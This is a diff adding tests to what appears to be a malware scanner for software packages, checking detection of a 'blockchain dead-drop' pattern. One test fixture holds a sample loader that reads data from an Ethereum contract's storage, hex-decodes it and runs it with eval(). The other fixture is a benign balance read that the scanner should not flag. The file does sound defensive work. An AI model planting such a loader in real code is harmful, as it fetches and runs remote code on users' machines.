@@ -155,6 +155,34 @@ test('MSH-SUP: token access + GitHub API triggers D4', async () => {
   assert.ok(ev.details.D4.matches.some((m) => m.type === 'token_exfil_github_api'));
 });
 
+test('MSH-SUP: on-chain dead-drop (EtherHiding/NullReceiver) triggers D4', async () => {
+  const files = [
+    {
+      path: 'drop.js',
+      content: `const { ethers } = require('ethers');
+const provider = new ethers.JsonRpcProvider('https://mainnet.infura.io/v3/KEY');
+const raw = await provider.send('eth_getStorageAt', ['0x1234567890123456789012345678901234567890', slot]);
+eval(Buffer.from(raw.slice(2), 'hex').toString());`,
+    },
+  ];
+  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
+  assert.equal(findings.length, 1);
+  const ev = JSON.parse(findings[0].evidence);
+  assert.ok(ev.triggeredChecks.includes('D4'));
+  assert.ok(ev.details.D4.matches.some((m) => m.type === 'blockchain_dead_drop'));
+});
+
+test('MSH-SUP: high-level ethers.js balance read is not a dead-drop', async () => {
+  const files = [
+    {
+      path: 'wallet.js',
+      content: `const { ethers } = require('ethers'); const bal = await provider.getBalance(addr);`,
+    },
+  ];
+  const findings = await scan({ name: 'test-pkg', version: '1.0.0' }, files);
+  assert.equal(findings.length, 0);
+});
+
 test('MSH-SUP: multiple signals trigger at once', async () => {
   const files = [
     {
